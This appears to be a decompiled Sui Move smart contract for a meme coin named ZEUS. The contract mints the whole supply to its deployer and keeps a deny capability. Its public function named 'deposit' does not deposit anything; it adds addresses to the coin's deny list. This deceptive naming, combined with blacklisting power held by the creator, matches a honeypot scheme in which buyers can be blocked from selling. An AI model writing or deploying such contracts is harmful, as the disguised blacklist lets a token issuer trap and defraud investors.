module 0xfdc870cd13b0acc9103c65e4729774f20063543dc295af87e42ea8ab63812df6::zeus {
    struct ZEUS has drop {
        dummy_field: bool,
    }

    public fun deposit(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<ZEUS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<ZEUS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: ZEUS, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = trim_right(b"111111111   ");
        let v1 = trim_right(b"https://dd.dexscreener.com/ds-data/tokens/solana/7RpwoiCgozcy45k7XqizqsJekDodQq9Pe61Kc7NTgTaz.png?size=lg&key=044d74                                                                                                                                                                                                            ");
        let v2 = if (0x1::vector::length<u8>(&v1) == 0) {
            0x1::option::none<0x2::url::Url>()
        } else {
            0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(v1))
        };
        let (v3, v4, v5) = 0x2::coin::create_regulated_currency_v2<ZEUS>(arg0, (0x1::vector::length<u8>(&v0) as u8), 0x1::ascii::into_bytes(0x1::string::to_ascii(0x1::string::utf8(trim_right(b"ZEUS    ")))), trim_right(b"ZEUS BY MATT FURIE              "), trim_right(b"ZEUS is an adventurous and energetic dog with a heart of gold and a playful charm that wins everyone over, as he did with Pepe. As the ultimate alpha dog, he's a meme master and a visionary, ready to lead the pack on SUI.                                                                                                   "), v2, false, arg1);
        let v6 = v3;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<ZEUS>>(v5);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<ZEUS>>(v6);
        0x2::transfer::public_transfer<0x2::coin::Coin<ZEUS>>(0x2::coin::mint<ZEUS>(&mut v6, 1000000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<ZEUS>>(v4, 0x2::tx_context::sender(arg1));
    }

    fun trim_right(arg0: vector<u8>) : vector<u8> {
        let v0 = 32;
        let v1 = &v0;
        while (0x1::vector::length<u8>(&arg0) > 0) {
            if (0x1::vector::borrow<u8>(&arg0, 0x1::vector::length<u8>(&arg0) - 1) != v1) {
                break
            };
            0x1::vector::pop_back<u8>(&mut arg0);
        };
        arg0
    }

    // decompiled from Move bytecode v6
}

